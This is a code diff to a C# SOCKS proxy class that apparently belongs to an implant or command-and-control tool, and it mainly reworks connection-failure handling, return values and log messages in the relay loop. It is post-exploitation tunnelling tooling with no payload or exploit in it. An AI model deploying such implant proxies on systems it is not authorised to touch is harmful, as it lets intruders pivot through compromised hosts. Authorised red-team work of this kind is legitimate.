@@ -25,7 +25,7 @@ namespace SocksProxy.Classes.Socks
 
         public bool OpenNewConnectionToTarget(String targetId, String targetHost, ushort targetPort)
         {
-            var target = new TargetInfo();
+			var target = new TargetInfo() { TargetPort = targetPort, TargetHost = targetHost };
             System.Net.Sockets.AddressFamily AF_TYPE = System.Net.Sockets.AddressFamily.InterNetwork;
             //Step 1. Open connection to target
             IPAddress targetIP = null;
@@ -61,10 +61,13 @@ namespace SocksProxy.Classes.Socks
 
                 if (Uri.CheckHostName(targetIP.ToString()) == UriHostNameType.IPv6)
                     AF_TYPE = System.Net.Sockets.AddressFamily.InterNetworkV6; ;
-                
-                target.TargetTcpClient = new System.Net.Sockets.TcpClient(AF_TYPE);
+
+				target.TargetTcpClient = new System.Net.Sockets.TcpClient(AF_TYPE);
                 target.TargetTcpClient.Connect(new System.Net.IPEndPoint(targetIP, targetPort));
-            }
+				if (!target.TargetTcpClient.Connected)
+					return false;
+
+			}
             catch (Exception ex)
             {
                 var lst = new List<String>
@@ -98,7 +101,7 @@ namespace SocksProxy.Classes.Socks
             return true;
         }
 
-        void ProxyLoop(String targetId)
+        bool ProxyLoop(String targetId)
         {
             List<byte> toSend = null;
             bool timedOut = false;
@@ -110,19 +113,19 @@ namespace SocksProxy.Classes.Socks
                 if (null == target)
                 {
                     ErrorHandler.LogError("Can't find target for GUID: " + targetId.ToString() + " exiting this proxy loop");
-                    return;
+                    return true;
                 }
                 var timeout = 0;
                 var timeoutCtr = 0;
                 var serverTimeCtr = 0;
 
-                toSend = CmdCommshandler.Send(targetId, "nochange", null);
-                if (null == toSend || toSend.Count() == 0) //No data to send just bail here connection on server side no doubt has been closed
-                {
-                    ErrorHandler.LogError($"Connection opened but no data sent for {target.TargetIP}:{target.TargetIP} binning connection now");
-                    connectionHasFailed = true;
-                }
-                while (!target.Exit && !timedOut && !connectionHasFailed)
+                toSend = CmdCommshandler.Send(targetId, "nochange", null, out bool connectionDead);
+				if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
+				{
+					ErrorHandler.LogError($"Connection looks dead EXITING");
+					return false;
+				}
+                while (!target.Exit && !timedOut)
                 {
                     var stream = target.TargetTcpClient.GetStream();
                     if (!target.TargetTcpClient.Connected)
@@ -158,13 +161,20 @@ namespace SocksProxy.Classes.Socks
                                 bytesRead = stream.Read(arrayBuffer, 0, 65535);
                                 lstBuffer.AddRange(arrayBuffer.ToList().Take(bytesRead));
                             }
-                            
-                         //   ImplantComms.HexDump(lstBuffer.ToArray(), 16);
 
-                            if (lstBuffer.Count() > 0)
-                                toSend = CmdCommshandler.Send(targetId, "nochange", lstBuffer);
+							//   ImplantComms.HexDump(lstBuffer.ToArray(), 16);
 
-                            timeout = 0;
+							if (lstBuffer.Count() > 0)
+							{
+								toSend = CmdCommshandler.Send(targetId, "nochange", lstBuffer, out connectionDead);
+								if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
+								{
+									ErrorHandler.LogError($"Connection looks dead EXITING");
+									return connectionDead;
+								}
+							}
+
+							timeout = 0;
                             timeoutCtr = 0;
                         }
                         else
@@ -176,11 +186,11 @@ namespace SocksProxy.Classes.Socks
                                 serverTimeCtr += timeout;
                                 if ((serverTimeCtr % TIMEBETWEENSERVERSENDS) == 0)
                                 {
-                                    toSend = CmdCommshandler.Send(targetId, "nochange", null);
-                                    if (null == toSend) //Cant't have worked just bail here connection no doubt has been closed
+									toSend = CmdCommshandler.Send(targetId, "nochange", null, out connectionDead);
+                                    if (null == toSend || connectionDead) //Cant't have worked just bail here connection no doubt has been closed
                                     {
-                                        connectionHasFailed = true;
-                                        break;
+										ErrorHandler.LogError($"Connection looks dead EXITING");
+										return connectionDead;
                                     }
                                 }
                             }
@@ -189,6 +199,7 @@ namespace SocksProxy.Classes.Socks
                         }
                     }
                 }
+				return true;
             }
             catch(Exception ex)
             {
@@ -206,13 +217,14 @@ namespace SocksProxy.Classes.Socks
                         target.TargetTcpClient.Close();
 
                 if (!connectionHasFailed)
-                    CmdCommshandler.Send(targetId, "closed", null);
+                    CmdCommshandler.Send(targetId, "closed", null, out bool connectionDead);
             }
+			return true;
         }
 
         public void StopAll()
         {
-            ImplantComms.LogMessage($"Close all triggered");
+            ImplantComms.LogMessage($"Shutdown all connections triggered");
             _targets.Keys.ToList().ForEach(x => {
                 Stop(x);
             });
@@ -221,7 +233,7 @@ namespace SocksProxy.Classes.Socks
         public void Stop(String targetId)
         {
             var target = _targets[targetId];
-            ImplantComms.LogMessage($"Closing {target.TargetIP}:{target.TargetPort}");
+            ImplantComms.LogMessage($"Closing connection to {target.TargetHost}:{target.TargetPort}");
             if (null != target)
             {
                 target.Exit = true;
@@ -239,7 +251,7 @@ namespace SocksProxy.Classes.Socks
         public bool HARDStop(String targetId)
         {
             var target = _targets[targetId];
-            ImplantComms.LogMessage($"HARD STOP ALL ON CONNECTION TO {target.TargetIP}:{target.TargetPort}");
+            ImplantComms.LogMessage($"HARD STOP ALL ON CONNECTION TO {target.TargetHost}:{target.TargetPort}");
             if (null != target)
             {
                 target.Exit = true;
